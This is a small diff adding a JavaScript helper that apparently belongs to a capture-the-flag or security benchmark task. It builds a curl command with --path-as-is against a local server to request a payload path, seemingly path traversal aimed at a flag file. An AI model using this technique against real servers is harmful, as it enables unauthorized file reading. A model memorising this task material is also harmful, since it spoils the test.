@@ -1,0 +1,8 @@
+function exploitFunction(payload) {
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;
+
+    return attack_string;
+}
+
+module.exports = { exploitFunction };
